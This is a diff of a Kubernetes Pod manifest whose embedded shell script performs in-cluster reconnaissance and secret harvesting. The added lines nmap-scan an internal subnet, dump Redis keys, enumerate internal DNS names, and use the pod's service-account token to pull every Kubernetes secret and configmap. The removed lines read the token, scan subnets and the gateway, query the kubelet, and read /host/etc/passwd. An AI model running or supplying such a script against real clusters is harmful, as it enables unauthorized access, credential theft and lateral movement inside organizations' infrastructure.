@@ -1,3 +1,4 @@
+
 apiVersion: v1
 kind: Pod
 metadata:
@@ -13,56 +14,34 @@ spec:
       - /bin/sh
       - -c
       - |
-        echo "[*] Installing tools..."
-        apk add --no-cache nmap curl iproute2 bind-tools net-tools util-linux procps > /dev/null 2>&1
-        echo "[*] Tools installed"
+        apk add --no-cache nmap curl iproute2 bind-tools redis > /dev/null 2>&1
 
-        echo "=== HOSTNAME ==="
-        hostname
+        echo "=== SCAN POD NETWORK (10.42.11.0/24) ==="
+        nmap -sT -p 80,443,3000,5432,6379,8080,8443,9200,5601,9000 10.42.11.0/24 2>&1 || true
 
-        echo "=== IP ADDRESSES ==="
-        ip a
+        echo "=== WEB SERVICES on 172.30.0.240 ==="
+        curl -sk https://172.30.0.240 2>&1 | head -50 || true
 
-        echo "=== ROUTES ==="
-        ip route
+        echo "=== WEB SERVICES on 172.30.0.250 ==="
+        curl -sk https://172.30.0.250 2>&1 | head -50 || true
 
-        echo "=== DNS ==="
-        cat /etc/resolv.conf
+        echo "=== REDIS 172.30.0.242 ==="
+        redis-cli -h 172.30.0.242 INFO 2>&1 || true
+        redis-cli -h 172.30.0.242 KEYS '*' 2>&1 || true
 
-        echo "=== ARP TABLE ==="
-        arp -a 2>/dev/null || true
+        echo "=== DNS INTERNI ==="
+        for name in n8n postgres redis minio elasticsearch kibana gitlab argocd rancher; do
+          echo "--- $name ---"
+          nslookup $name.egam.com.br 10.10.10.23 2>&1 || true
+          nslookup $name 10.10.10.23 2>&1 || true
+        done
 
-        echo "=== HOSTS FILE ==="
-        cat /etc/hosts
+        echo "=== KUBERNETES SECRETS ==="
+        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+        curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets 2>&1 | head -100 || true
 
-        echo "=== PING GATEWAY ==="
-        GW=$(ip route | awk '/default/ {print $3}')
-        ping -c 2 "$GW" 2>&1 || true
-
-        echo "=== NMAP INTERNAL SUBNET (172.30.0.0/24) ==="
-        nmap -sT -p 22,80,443,3306,5432,6379,8080,8443,9200,27017 172.30.0.0/24 2>&1 || true
-
-        echo "=== NMAP GATEWAY COMMON PORTS ==="
-        nmap -sT -p 1-1000 "$GW" 2>&1 || true
-
-        echo "=== KUBELET ==="
-        curl -sk https://172.30.0.15:10250/pods 2>&1 || true
-
-        echo "=== SERVICE ACCOUNT TOKEN ==="
-        head -c 200 /var/run/secrets/kubernetes.io/serviceaccount/token
-        echo ""
-
-        echo "=== KUBERNETES API PODS ==="
-        curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/pods 2>&1 || true
-
-        echo "=== HOST FILESYSTEM (/host) ==="
-        ls -la /host 2>&1 || true
-
-        echo "=== HOST PASSWD ==="
-        cat /host/etc/passwd 2>&1 || true
-
-        echo "=== HOST PROCESSES (hostPID) ==="
-        ps aux 2>&1 || true
+        echo "=== KUBERNETES CONFIGMAPS ==="
+        curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/configmaps 2>&1 | head -100 || true
 
         echo "=== DONE ==="
         sleep 36000
